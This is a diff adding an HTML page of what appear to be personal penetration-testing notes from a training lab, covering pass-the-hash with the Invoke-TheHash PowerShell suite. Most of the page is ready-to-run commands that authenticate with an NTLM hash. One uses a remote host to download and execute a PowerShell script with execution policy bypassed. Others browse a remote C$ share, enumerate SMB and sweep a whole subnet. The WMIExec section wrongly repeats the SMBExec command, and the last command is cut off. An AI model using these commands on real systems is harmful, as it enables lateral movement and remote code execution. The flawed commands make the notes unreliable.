@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>via Invoke-TheHash</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Using Hashes - from Windows - via Invoke-TheHash</h1></strong><br />Invoke-TheHash is a suite of PowerShell scripts to pass hashes via multiple different services.<br /><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br /><br /><strong><h2>## Invoke-SMBExec</h2></strong><br /><code>Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command &#39;powershell -ep bypass -Command &quot;iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)&quot;&#39; -verbose</code><br /><br /><strong><h2>## Invoke-WMIExec</h2></strong><br /><code>Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command &#39;powershell -ep bypass -Command &quot;iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)&quot;&#39; -verbose</code><br /><br /><strong><h2>## Invoke-SMBClient</h2></strong><br /><code>Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose</code><br /><br /><strong><h2>## Invoke-SMBEnum</h2></strong><br /><code>Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose</code><br /><br /><strong><h2>## Invoke-TheHash</h2></strong><br />This function is a mix of all the others. You can pass several hosts, exclude some and select the option you want to use (SMBExec, WMIExec, SMBClient, SMBEnum). If you select any of SMBExec and WMIExec but you don&#39;t give any Command parameter it will just check if you have enough permissions.<br /><br /><code>Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExcl</code></div>
+</body>
+</html>
